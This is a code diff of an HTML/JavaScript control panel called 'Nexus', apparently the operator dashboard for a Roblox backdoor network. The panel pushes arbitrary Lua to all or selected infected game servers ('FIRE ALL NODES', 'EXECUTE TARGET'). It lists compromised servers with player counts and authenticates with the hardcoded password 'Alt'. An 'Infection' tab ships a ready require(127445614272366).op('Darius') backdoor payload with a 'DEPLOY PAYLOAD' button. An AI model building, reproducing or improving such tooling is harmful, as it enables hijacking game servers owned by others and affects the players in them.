@@ -2,35 +2,33 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Final Build</title>
+    <title>Nexus  | Stable Connection</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; --card-bg: #1c1c1e; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
         .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
         .nav { display: flex; gap: 8px; }
-        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 6px 10px; border-radius: 6px; text-transform: uppercase; transition: 0.3s; }
+        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 6px 10px; border-radius: 6px; text-transform: uppercase; }
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: var(--card-bg); border-radius: 20px; width: 600px; padding: 25px; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-        h2 { margin: 0 0 15px 0; font-size: 18px; font-weight: 600; }
-        textarea, input, select { width: 100%; border-radius: 10px; border: 1px solid #424245; background: #000; color: #fff; padding: 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; font-size: 12px; }
-        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 10px; padding: 14px; width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-main:active { opacity: 0.7; }
+        h2 { margin: 0 0 15px 0; font-size: 18px; }
+        textarea, input, select { width: 100%; border-radius: 10px; border: 1px solid #424245; background: #000; color: #fff; padding: 12px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 12px; }
+        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 10px; padding: 14px; width: 100%; font-weight: 600; cursor: pointer; }
         .row-btns { display: flex; gap: 6px; margin-bottom: 12px; flex-wrap: wrap; }
-        .rh-pill { background: #333; color: #fff; border: none; padding: 6px 12px; border-radius: 15px; font-size: 10px; cursor: pointer; transition: 0.2s; }
+        .rh-pill { background: #333; color: #fff; border: none; padding: 6px 12px; border-radius: 15px; font-size: 10px; cursor: pointer; }
         .rh-pill:hover { background: var(--apple-blue); }
-        .node-box { background: #0b0b0c; border-radius: 12px; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 5px; }
-        .game-item { background: #161617; margin: 5px; padding: 12px; border-radius: 10px; border: 1px solid #2c2c2e; display: flex; justify-content: space-between; align-items: center; }
-        .job-id { font-family: monospace; color: #0071e3; background: rgba(0,113,227,0.1); padding: 2px 6px; border-radius: 4px; font-size: 10px; display: inline-block; margin-top: 4px; }
-        .join-btn { background: #fff; color: #000; text-decoration: none; font-size: 11px; font-weight: 800; padding: 8px 16px; border-radius: 15px; }
-        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(15px); padding: 10px 18px; border-radius: 25px; border: 1px solid #444; display: flex; gap: 12px; z-index: 2000; }
+        .node-box { background: #0b0b0c; border-radius: 12px; height: 180px; overflow-y: auto; border: 1px solid #333; }
+        .game-item { padding: 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        .job-id { font-family: monospace; color: #0071e3; background: rgba(0,113,227,0.1); padding: 2px 6px; border-radius: 4px; font-size: 9px; margin-top: 5px; display: inline-block; }
+        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 10px 18px; border-radius: 25px; border: 1px solid #444; display: flex; gap: 12px; z-index: 2000; }
     </style>
 </head>
 <body onclick="startAudio()">
     <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1492178549317308426/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69da6311&is=69d91191&hm=f174788afceacbba804576a6c0e91386a5e3a077bacbedbc981032a8ec393a1c&"></audio>
 
     <div class="header">
-        <div style="font-weight:700; letter-spacing: -0.5px;"> NEXUS</div>
+        <div style="font-weight:700;"> NEXUS</div>
         <div class="nav">
             <button id="btn-mass" class="nav-btn active" onclick="showTab('mass')">Mass</button>
             <button id="btn-single" class="nav-btn" onclick="showTab('single')">Single</button>
@@ -52,8 +50,8 @@
                     <button class="rh-pill" onclick="fillRH('DS', 'm_lua')">DarkSynapse</button>
                     <button class="rh-pill" onclick="fillRH('Steve', 'm_lua')">Steve</button>
                 </div>
-                <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
-                <button class="btn-main" onclick="send('mass')">EXECUTE ALL</button>
+                <textarea id="m_lua" rows="8" placeholder="-- Global Lua"></textarea>
+                <button class="btn-main" onclick="send('mass')">FIRE ALL NODES</button>
             </div>
 
             <div id="single" class="tab-content" style="display:none;">
@@ -62,32 +60,29 @@
                     <button class="rh-pill" onclick="fillRH(1, 's_lua')">Last Rig</button>
                     <button class="rh-pill" onclick="fillRH(2, 's_lua')">Require.EXE</button>
                     <button class="rh-pill" onclick="fillRH(3, 's_lua')">Darius</button>
-                    <button class="rh-pill" onclick="fillRH('R6', 's_lua')">R6</button>
-                    <button class="rh-pill" onclick="fillRH('DS', 's_lua')">DarkSynapse</button>
-                    <button class="rh-pill" onclick="fillRH('Steve', 's_lua')">Steve</button>
                 </div>
                 <div style="display: flex; gap: 8px;">
-                    <select id="target_id" style="flex: 2;"><option value="">Select Target Server...</option></select>
+                    <select id="target_id" style="flex: 2;"><option value="">Detecting Servers...</option></select>
                     <input type="text" id="manual_id" placeholder="Manual JobID" style="flex: 1;">
                 </div>
-                <textarea id="s_lua" rows="5" placeholder="-- Target Lua"></textarea>
-                <button class="btn-main" onclick="send('single')">EXECUTE ON TARGET</button>
+                <textarea id="s_lua" rows="6" placeholder="-- Target Lua"></textarea>
+                <button class="btn-main" onclick="send('single')">EXECUTE TARGET</button>
             </div>
 
             <div id="inf" class="tab-content" style="display:none;">
                 <h2>Infection</h2>
                 <textarea id="i_lua" rows="9">require(127445614272366).op("Darius")</textarea>
-                <button class="btn-main" onclick="send('inf')">DEPLOY</button>
+                <button class="btn-main" onclick="send('inf')">DEPLOY PAYLOAD</button>
             </div>
 
             <div id="wl" class="tab-content" style="display:none;">
-                <h2>Whitelist Settings</h2>
-                <input type="text" id="wid" placeholder="Roblox Username">
-                <button class="btn-main" onclick="saveWl()">SAVE TARGET</button>
+                <h2>Whitelist</h2>
+                <input type="text" id="wid" placeholder="Username for RequireHub">
+                <button class="btn-main" onclick="saveWl()">SAVE USER</button>
             </div>
 
             <div id="nodes" class="tab-content" style="display:none;">
-                <h2>Active Nodes</h2>
+                <h2>Active Instances (Modern UI)</h2>
                 <div id="node_list" class="node-box"></div>
             </div>
         </div>
@@ -127,27 +122,25 @@
         async function update() {
             try {
                 const res = await fetch('/get-games');
+                if(!res.ok) throw new Error("Server down");
                 currentNodes = await res.json();
                 const keys = Object.keys(currentNodes);
                 
                 const dropdown = document.getElementById('target_id');
-                const lastVal = dropdown.value;
-                dropdown.innerHTML = '<option value="">Choose Node...</option>' + 
-                    keys.map(k => `<option value="${k}">${currentNodes[k].name || 'Node'}</option>`).join('');
-                if(keys.includes(lastVal)) dropdown.value = lastVal;
+                const last = dropdown.value;
+                dropdown.innerHTML = '<option value="">Select Server...</option>' + 
+                    keys.map(k => `<option value="${k}">${currentNodes[k].name || 'Active'}</option>`).join('');
+                if(keys.includes(last)) dropdown.value = last;
 
-                document.getElementById('node_list').innerHTML = keys.map(k => {
-                    const count = (currentNodes[k].players) ? currentNodes[k].players.length : 0;
-                    return `
+                document.getElementById('node_list').innerHTML = keys.map(k => `
                     <div class="game-item">
-                        <div style="max-width: 65%;">
-                            <b>${currentNodes[k].name || "Node"}</b><br>
+                        <div style="max-width: 70%;">
+                            <b style="font-size:14px;">${currentNodes[k].name || "Node"}</b><br>
                             <span class="job-id">${k}</span><br>
-                            <small style="color:#34c759;">Players: ${count}</small>
+                            <small style="color: #34c759; font-weight:bold;">Players: ${(currentNodes[k].players||[]).length}</small>
                         </div>
-                        <a href="roblox://placeId=${currentNodes[k].placeId || ''}&gameInstanceId=${k}" class="join-btn">JOIN</a>
-                    </div>`;
-                }).join('') || '<div style="padding:40px; text-align:center;">Searching for Nodes...</div>';
+                        <a href="roblox://placeId=${currentNodes[k].placeId || ''}&gameInstanceId=${k}" style="background:#fff; color:#000; padding:8px 16px; border-radius:15px; font-size:11px; text-decoration:none; font-weight:800;">JOIN</a>
+                    </div>`).join('') || '<div style="padding:40px; text-align:center;">Scanning for Jobs...</div>';
             } catch(e) {}
         }
 
@@ -156,13 +149,23 @@
             let tid = null;
             if(tabId === 'single') {
                 tid = document.getElementById('manual_id').value.trim() || document.getElementById('target_id').value;
-                if(!tid) return alert("Select a JobID!");
+                if(!tid) return alert("Error: Missing JobID");
             }
-            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:"Alt", targetId:tid})});
-            alert("Dispatched");
+
+            try {
+                const res = await fetch('/push-lua', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ lua, password: "Alt", targetId: tid })
+                });
+                if(res.ok) alert("Payload Sent!");
+                else alert("Server error: Check Render logs.");
+            } catch(err) {
+                alert("Connection Failed. Make sure Render is awake.");
+            }
         }
 
-        function saveWl() { alert("Target locked."); }
+        function saveWl() { alert("Username updated."); }
 
         setInterval(update, 5000);
         window.onload = () => { showTab('mass'); update(); };
